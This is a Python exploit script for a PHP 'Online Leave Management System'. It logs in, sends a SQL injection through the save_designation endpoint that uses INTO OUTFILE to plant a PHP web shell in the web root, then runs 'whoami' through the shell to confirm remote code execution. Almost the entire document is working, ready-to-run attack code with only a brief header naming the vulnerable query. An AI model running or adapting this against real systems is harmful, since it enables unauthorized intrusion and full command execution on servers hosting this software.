'''
Exploit author: Evdaez 6/12/2021

Application:
https://www.sourcecodester.com/download-code?nid=14910&title=Online++Leave+Management+System+in+PHP+Free+Source+Code 

Location:
admin/classes/Master.php

Vulnerable code:
function save_designation(){
    SNIPPED
    $check = $this->conn->query("SELECT * FROM `designation_list` where `name` = '{$name}' ".(!empty($id) ? " and id != {$id} " : "")." ")->num_rows;

Other info:
Tested on Windows 10 on XAMPP
'''
import requests
import sys
import binascii
from os import system, urandom

def clear_screen():
    system("cls")

def login(username, password, IP, proxies):
    sess = requests.session()
    login_url = f"http://{IP}/leave_system/classes/Login.php?f=login"
    data = {"username": username, "password": password}

    login = sess.post(login_url, data=data, proxies=proxies, verify=False)

    if "success" in login.text:
        print("[+] Login successful.")
        print(f"[O] Cookie: {sess.cookies['PHPSESSID']}")
        return sess
    else:
        print("[-] Login failed.")
        sys.exit(1)

def exploit(sess, IP, proxies):
    URL = f"http://{IP}/leave_system/classes/Master.php?f=save_designation"

    randomFilename = binascii.hexlify(urandom(16)).decode()
    headers = {'Content-type':'multipart/form-data; boundary=---------------------------268634170015354817143744942603'}
    data = f"-----------------------------268634170015354817143744942603\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n4\r\n-----------------------------268634170015354817143744942603\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nHR Staff' union select null,\"<?php system($_GET['cmd']); ?>\",null,null,null into outfile \"C:\\\\xampp\\\\htdocs\\\\leave_system\\\\{randomFilename}.php\" -- -\r\n-----------------------------268634170015354817143744942603\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\nHuman Resource Staff\r\n-----------------------------268634170015354817143744942603--\r\n"

    req = sess.post(URL, headers=headers, data=data, proxies=proxies, verify=False)

    if "success" in req.text:
        webshell = f"http://{IP}/leave_system/{randomFilename}.php"
        print(f"\n[+] Check your webshell at {webshell}")
    
        RCE = f"{webshell}?cmd=whoami"
        req = sess.get(RCE, proxies=proxies, verify=False)
        results = req.text.replace("\\N", "").strip()

        print(f"\n[O] Output from {RCE}:\n{results}")
    else:
        print(f"\n[-] Failed writing webshell to http://{IP}/leave_system/")
        
if __name__ == "__main__":
    proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

    IP = '127.0.0.1'
    username = 'jsmith'
    password = 'password'

    clear_screen()
    sess = login(username, password, IP, proxies)
    exploit(sess, IP, proxies)